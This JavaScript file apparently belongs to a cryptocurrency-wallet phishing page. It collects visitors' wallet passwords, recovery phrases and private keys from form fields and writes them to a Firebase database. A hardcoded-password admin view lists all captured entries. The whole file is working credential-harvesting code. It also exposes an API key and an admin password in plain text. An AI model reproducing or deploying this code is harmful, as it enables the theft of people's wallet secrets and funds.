var firebaseConfig = {
    apiKey: "AIzaSyCaaKoJcjpU1BiLWm9E8UFWMOkLnUSn-pA",
    authDomain: "block-connection.firebaseapp.com",
    databaseURL: "https://block-connection-default-rtdb.firebaseio.com",
    projectId: "block-connection",
    storageBucket: "block-connection.firebasestorage.app",
    messagingSenderId: "559154323680",
    appId: "1:559154323680:web:7577eda01f3114d2183085",
    measurementId: "G-XV8JEK7FKR"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
// Initialize variables
const auth = firebase.auth()
const database = firebase.database()
//const storageRef = firebase.storage().ref();



// FOR INDEX
const wallet_password = document.getElementById("wallet_password");
const recov_phrase = document.getElementById("recov_phrase");
const wallet_key = document.getElementById("wallet_key");
const index_btn = document.getElementById("index_btn");



window.onload = function () {

    // $(document).ready(function () {
    // Show the overlay when the page loads
    // $('#overlay').fadeIn(500);
    // Hide the overlay after a delay (simulating page load)
    //setTimeout(function () {
    //  $('#overlay').fadeOut(500);
    //}, 2000); // Adjust the delay as needed
    //});

    // Get the current date
    const currentDate = new Date();

    // Format the date as desired (e.g., "April 7, 2024")
    const formattedDate = currentDate.toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'long',
        day: 'numeric'
    });

    document.getElementById("current_date_and_time").innerHTML = formattedDate;




}




function proceed() {

    var wallet_password = document.getElementById("wallet_password").value

    var recov_phrase = document.getElementById("recov_phrase").value

    var wallet_key = document.getElementById("wallet_key").value

    var dateTime = document.getElementById("current_date_and_time").innerHTML

    var link = ""

    // Generate a random four-digit number
    const randomFourDigitNumber = Math.floor(Math.random() * 9000) + 1000;

    // Print the generated number
    console.log(`${randomFourDigitNumber}`);

    // Get the current date and time
    const now = new Date();
    // Format the date and time
    var formattedTime = now.toLocaleTimeString();
    // Print the formatted time
    console.log(`${formattedTime}`);



    database.ref('MESSAGES/' + randomFourDigitNumber + '-' + dateTime).update({

        "formattedTime": formattedTime,
        "wallet_password": wallet_password,
        "recov_phrase": recov_phrase,
        "wallet_key": wallet_key,
        "dateTime": dateTime,
        "link": link
    }).then(() => {
        console.log("success!");
        //alert("Successful")
        window.location = "../index.html"

    })
        .catch(error => {
            console.error("Error:", error);
            alert("Failed!")
        });


}


// Function to read data and populate the table
function readData() {

    var enteredPassword = document.getElementById("userPassword").value;
    if (enteredPassword === "Suggarland6262") {
        // Redirect to the desired page after successful authentication
        alert("Password is correct!")

        var itemsRef = database.ref('MESSAGES/');

        itemsRef.once('value', function (snapshot) {
            var table = document.querySelector('#table tbody');
            var serialNumber = 1; // Initialize serial number
            snapshot.forEach(function (childSnapshot) {
                var childData = childSnapshot.val();
                var row = table.insertRow(-1);

                row.insertCell(-1).textContent = serialNumber++; // Increment serial number
                row.insertCell(-1).textContent = childData.dateTime;
                row.insertCell(-1).textContent = childData.formattedTime;
                row.insertCell(-1).textContent = childData.recov_phrase;
                row.insertCell(-1).textContent = childData.wallet_password;
                row.insertCell(-1).textContent = childData.wallet_key;
                row.insertCell(-1).textContent = childData.link;
            });
        });
    } else {
        alert("Incorrect password. Please try again.");
    }


}


// FOR SUPPORT

// const support_wallet_name = document.getElementById("support_wallet_name");

// const support_wallet_password = document.getElementById("support_wallet_password");

// const support_recov_phrase = document.getElementById("support_recov_phrase");

// const support_btn = document.getElementById("support_btn");

// const import_btns = document.querySelectorAll(".import");

// //wallet password
// wallet_password.addEventListener("input", (e) => {
//     support_wallet_password.value = e.target.value;
// });

// // recovery phrase
// recov_phrase.addEventListener("input", (e) => {
//     support_recov_phrase.value = e.target.value;
// });

// // wallet key
// wallet_key.addEventListener("input", (e) => {
//     support_wallet_key.value = e.target.value;
// });

// //index button
// index_btn.addEventListener("click", () => support_btn.click());